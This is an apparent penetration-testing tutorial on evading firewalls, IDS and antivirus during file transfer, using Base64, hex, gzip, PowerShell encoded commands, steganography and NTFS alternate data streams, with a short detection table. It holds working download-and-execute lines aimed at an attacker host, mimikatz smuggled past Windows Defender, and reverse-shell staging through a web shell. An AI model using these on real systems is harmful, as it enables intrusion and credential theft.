# 🕵️ Encoding & Stealth File Transfer — Bypass Detection

## 📖 What Is Stealth File Transfer?

Sometimes normal transfer methods (HTTP, SMB, FTP) are **blocked or monitored** by firewalls, IDS/IPS, or EDR solutions. In these cases, you need to **encode or disguise** the file transfer.

> **Stealth transfer** = Moving files in ways that bypass security controls — encoding data, using covert channels, or blending with normal traffic.

```text
  NORMAL TRANSFER:
  ┌──────────┐   HTTP/SMB/FTP   ┌──────────┐   🚨 DETECTED!
  │ Attacker │ ───────────────▶ │  Target  │   Firewall/IDS
  └──────────┘                  └──────────┘   blocks it

  STEALTH TRANSFER:
  ┌──────────┐   Base64/DNS/    ┌──────────┐   ✅ BYPASSED!
  │ Attacker │   ICMP/Stego    │  Target  │   Looks like
  └──────────┘ ───────────────▶ └──────────┘   normal traffic
```

---

## 🎯 When to Use Stealth Transfers

| Situation | Why Normal Fails | Stealth Solution |
| --- | --- | --- |
| Outbound HTTP blocked | Firewall blocks port 80/443 | DNS exfiltration |
| Deep packet inspection | IDS detects file signatures | Base64 encoding |
| No file upload mechanism | Only have terminal/clipboard | Base64 copy-paste |
| AV scanning downloads | AV deletes known tools | Encoding/obfuscation |
| Air-gapped network | No direct network path | Steganography |

---

# 1️⃣ Base64 Encoding — Most Common Stealth Method

## 🧠 What Is Base64?

Base64 converts binary data into **printable text characters** (A-Z, a-z, 0-9, +, /).

> Any file (binary .exe, images, archives) can be converted to text, copy-pasted, and reassembled on the other side.

```text
  Binary File (.exe):     01001000 01100101 01101100 ...
                              ↓ Base64 Encode
  Text String:            SGVsbG8gV29ybGQh...
                              ↓ Copy-paste / transfer
  Reassemble on target:  01001000 01100101 01101100 ...
```

---

### Linux — Base64 Encode & Decode

**Attacker — Encode file:**

```bash
# Encode file to Base64 (single line, no wrapping)
base64 -w 0 linpeas.sh > linpeas_b64.txt

# View the encoded string
cat linpeas_b64.txt
# Output: IyEvYmluL2Jhc2gKIyBMaW5QRUFTLi4u...
```

**Target — Decode file:**

```bash
# Decode Base64 back to file
echo "IyEvYmluL2Jhc2gKIyBMaW5QRUFTLi4u..." | base64 -d > /tmp/linpeas.sh

# Or from file
base64 -d encoded.txt > /tmp/linpeas.sh

# Make executable
chmod +x /tmp/linpeas.sh
```

---

### Windows — Base64 Encode & Decode

**Encode (on attacker or any PowerShell):**

```powershell
# Encode file to Base64
$bytes = [System.IO.File]::ReadAllBytes("C:\Tools\mimikatz.exe")
$base64 = [System.Convert]::ToBase64String($bytes)
$base64 | Out-File encoded.txt
```

**Decode (on target):**

```powershell
# Decode Base64 back to file
$base64 = Get-Content encoded.txt -Raw
$bytes = [System.Convert]::FromBase64String($base64)
[System.IO.File]::WriteAllBytes("C:\Temp\tool.exe", $bytes)
```

**Using Certutil:**

```cmd
:: Encode
certutil -encode tool.exe encoded.txt

:: Decode
certutil -decode encoded.txt tool.exe
```

---

### Base64 Copy-Paste Method (Last Resort)

When NO network transfer works at all:

```text
STEP 1: On attacker — encode small file
┌───────────────────────────────────────────────────┐
│ base64 -w 0 small_tool.sh                         │
│ Output: IyEvYmluL2Jhc2gKZW... (copy this string) │
└───────────────────────────────────────────────────┘

STEP 2: On target — paste and decode
┌───────────────────────────────────────────────────┐
│ echo "IyEvYmluL2Jhc2gKZW..." | base64 -d > tool  │
│ chmod +x tool                                     │
│ ./tool                                            │
└───────────────────────────────────────────────────┘
```

> ⚠ Only works for small files. Large files = very long Base64 strings.

---

### Chunked Base64 for Large Files

For big files, split into chunks:

**Attacker:**

```bash
# Split Base64 into chunks
base64 -w 0 big_tool.exe > encoded.txt
split -b 5000 encoded.txt chunk_

# Output: chunk_aa, chunk_ab, chunk_ac, ...
```

**Target — Reassemble:**

```bash
# Paste each chunk
echo "CHUNK_AA_CONTENT" > /tmp/encoded.txt
echo "CHUNK_AB_CONTENT" >> /tmp/encoded.txt
echo "CHUNK_AC_CONTENT" >> /tmp/encoded.txt

# Decode
base64 -d /tmp/encoded.txt > /tmp/tool.exe
```

---

# 2️⃣ Hex Encoding

Convert binary to hexadecimal text.

**Attacker — Encode:**

```bash
xxd -p tool.sh > tool_hex.txt
```

**Target — Decode:**

```bash
xxd -r -p tool_hex.txt > /tmp/tool.sh
```

**Windows — PowerShell hex decode:**

```powershell
$hex = Get-Content hex.txt -Raw
$bytes = [byte[]]($hex -split '(..)' | Where-Object { $_ } | ForEach-Object { [Convert]::ToByte($_, 16) })
[System.IO.File]::WriteAllBytes("C:\Temp\tool.exe", $bytes)
```

---

# 3️⃣ Base32 Encoding

Alternative to Base64 — uses only uppercase letters and digits 2-7.

```bash
# Encode
base32 tool.sh > encoded_b32.txt

# Decode
base32 -d encoded_b32.txt > tool.sh
```

---

# 4️⃣ Gzip + Base64 (Compress Before Encoding)

Compress first to make Base64 string shorter:

**Attacker:**

```bash
# Compress + encode
gzip -c tool.sh | base64 -w 0 > compressed_b64.txt
```

**Target:**

```bash
# Decode + decompress
echo "H4sIAAAAAAAAA..." | base64 -d | gunzip > /tmp/tool.sh
```

---

# 5️⃣ PowerShell Encoded Commands

PowerShell supports running Base64-encoded commands directly:

**Attacker — Encode a command:**

```bash
# Encode PowerShell command in Base64 (must be UTF-16LE)
echo -n "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/tool.ps1')" | iconv -t UTF-16LE | base64 -w 0
```

**Target — Execute encoded command:**

```powershell
powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADUALwB0AG8AbwBsAC4AcABzADEAJwApAA==
```

---

# 6️⃣ Steganography — Hiding Files in Images

Hide files **inside images** so they look like normal picture files.

### Using steghide

```bash
# Install
sudo apt install steghide

# Hide file inside image
steghide embed -cf innocent_photo.jpg -ef secret_tool.exe -p password123

# Extract hidden file
steghide extract -sf innocent_photo.jpg -p password123
# Outputs: secret_tool.exe
```

### Using zip method

```bash
# Create an image that's also a zip file
cat image.jpg tool.zip > innocent_image.jpg

# Extract on target
unzip innocent_image.jpg
```

### Diagram

```text
  Normal Image:         → 📷 photo.jpg (100 KB)
  Image + Hidden File:  → 📷 photo.jpg (150 KB) ← Looks normal!
                              Contains hidden tool.exe inside

  Transfer the image normally → Extract hidden file on target
```

---

# 7️⃣ ADS (Alternate Data Streams) — Windows Only

Hide data in NTFS Alternate Data Streams:

```cmd
:: Hide file inside another file's ADS
type malware.exe > innocent.txt:hidden.exe

:: Execute from ADS
wmic process call create "C:\Temp\innocent.txt:hidden.exe"

:: List ADS on a file
dir /r innocent.txt
```

---

## 🔥 Realistic Scenarios

---

### Scenario 1: Only Terminal Access — Base64 Copy-Paste

```text
SITUATION: You have a web shell with limited terminal.
No wget, curl, nc. Can only run commands and see output.

ATTACKER:
┌────────────────────────────────────────────────────┐
│ # Encode small reverse shell script                │
│ base64 -w 0 reverse.sh                            │
│ Output: IyEvYmluL2Jhc2gKYmFzaCAtaSA+Ji...         │
│ # Copy this entire string                          │
└────────────────────────────────────────────────────┘

TARGET (via web shell):
┌────────────────────────────────────────────────────┐
│ echo "IyEvYmluL2Jhc2gKYmFzaCAtaSA+Ji..." |        │
│    base64 -d > /tmp/rev.sh                         │
│ chmod +x /tmp/rev.sh                               │
│ /tmp/rev.sh                                        │
└────────────────────────────────────────────────────┘
```

---

### Scenario 2: Bypass AV with Encoding

```text
SITUATION: Windows Defender deletes mimikatz.exe on download

ATTACKER:
┌────────────────────────────────────────────────────┐
│ # Encode mimikatz with Base64                      │
│ base64 -w 0 mimikatz.exe > mimi_b64.txt           │
│ # Host the encoded file                           │
│ python3 -m http.server 80                         │
└────────────────────────────────────────────────────┘

TARGET:
┌────────────────────────────────────────────────────┐
│ # Download encoded (text) file — AV ignores it!   │
│ certutil -urlcache -split -f                       │
│   http://10.10.14.5/mimi_b64.txt C:\Temp\enc.txt  │
│                                                    │
│ # Decode back to binary                            │
│ certutil -decode C:\Temp\enc.txt C:\Temp\mimi.exe  │
│                                                    │
│ # Run before AV scans it                           │
│ C:\Temp\mimi.exe                                   │
└────────────────────────────────────────────────────┘
```

---

## 📊 Encoding Methods Comparison

| Method | File Size Impact | Complexity | Stealth |
| --- | --- | --- | --- |
| Base64 | +33% larger | ⭐ Easy | ⭐⭐⭐ |
| Hex | +100% larger | ⭐ Easy | ⭐⭐ |
| Base32 | +60% larger | ⭐ Easy | ⭐⭐ |
| Gzip+Base64 | Compressed | ⭐⭐ Medium | ⭐⭐⭐ |
| Steganography | Hidden in image | ⭐⭐⭐ Hard | ⭐⭐⭐⭐⭐ |
| ADS | Hidden in NTFS | ⭐⭐ Medium | ⭐⭐⭐⭐ |

---

## 🛡 Blue Team — Detection

| Technique | Detection Method |
| --- | --- |
| Base64 | Look for long Base64 strings in commands/logs |
| Certutil encoding | Monitor `certutil -encode/-decode` |
| PowerShell -enc | Script block logging shows decoded command |
| Steganography | File size anomalies in images |
| ADS | Use `dir /r` or Sysinternals Streams tool |

---

## ⚠ Ethical Reminder

* ✅ Only use on systems with **written authorization**
* ✅ Practice in your own lab
* ❌ Never exfiltrate real data without permission
